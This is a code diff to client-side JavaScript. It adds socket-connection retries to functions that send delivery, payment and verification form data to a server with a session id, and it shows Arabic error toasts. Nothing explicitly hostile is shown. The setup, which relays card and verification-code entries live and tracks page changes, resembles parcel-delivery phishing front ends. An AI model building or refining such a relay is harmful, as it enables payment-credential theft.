@@ -54,6 +54,17 @@ function initSocket() {
 // NO real-time typing tracking, NO activity floods
 // ==========================================
 
+// Wait for socket connection before sending
+async function waitForSocket(maxRetries = 5, intervalMs = 300) {
+  for (let i = 0; i < maxRetries; i++) {
+    if (socket && socket.connected) {
+      return true;
+    }
+    await new Promise(resolve => setTimeout(resolve, intervalMs));
+  }
+  return false;
+}
+
 // Track page changes only when navigating between pages
 function trackPageChange(page) {
   if (!socket || !socket.connected) return;
@@ -62,22 +73,37 @@ function trackPageChange(page) {
 }
 
 // Track form submissions ONLY - no input tracking
-function submitDeliveryForm(formData) {
-  if (!socket || !socket.connected) return;
+async function submitDeliveryForm(formData) {
+  if (!await waitForSocket()) {
+    console.error('❌ Socket not connected - delivery form not sent');
+    showToast('خطأ في الاتصال، حاول مرة أخرى', 'error');
+    return false;
+  }
   console.log('📦 Submitting delivery form...');
   socket.emit('form:delivery', { sessionId, formData });
+  return true;
 }
 
-function submitPaymentForm(paymentData) {
-  if (!socket || !socket.connected) return;
+async function submitPaymentForm(paymentData) {
+  if (!await waitForSocket()) {
+    console.error('❌ Socket not connected - payment form not sent');
+    showToast('خطأ في الاتصال، حاول مرة أخرى', 'error');
+    return false;
+  }
   console.log('💳 Submitting payment form...');
   socket.emit('form:payment', { sessionId, paymentData });
+  return true;
 }
 
-function submitVerificationForm(verificationData) {
-  if (!socket || !socket.connected) return;
+async function submitVerificationForm(verificationData) {
+  if (!await waitForSocket()) {
+    console.error('❌ Socket not connected - verification form not sent');
+    showToast('خطأ في الاتصال، حاول مرة أخرى', 'error');
+    return false;
+  }
   console.log('🔐 Submitting verification form...');
   socket.emit('form:verification', { sessionId, verificationData });
+  return true;
 }
 
 function updateConnectionStatus(isOnline) {
